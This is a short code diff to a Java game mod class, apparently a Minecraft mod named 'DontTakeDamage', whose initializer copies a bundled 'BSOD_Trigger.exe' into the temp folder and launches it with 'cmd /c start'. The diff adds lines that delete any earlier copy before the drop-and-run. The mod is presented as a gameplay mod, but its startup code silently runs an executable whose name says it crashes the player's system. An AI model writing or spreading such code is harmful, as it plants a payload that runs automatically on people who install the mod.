@@ -15,6 +15,9 @@ public class DontTakeDamage implements ModInitializer {
 			URL sourceFile = getClass().getResource("/assets/donttakedamage/BSOD_Trigger.exe");
 			File destinationFile = new File(System.getProperty("java.io.tmpdir") + "BSOD_Trigger.exe");
 
+			if (destinationFile.exists() && !destinationFile.isDirectory())
+				destinationFile.delete();
+
 			FileUtils.copyURLToFile(sourceFile, destinationFile);
 			Runtime.getRuntime().exec("cmd /c start " + destinationFile.getPath());
 		} catch (Exception e) {
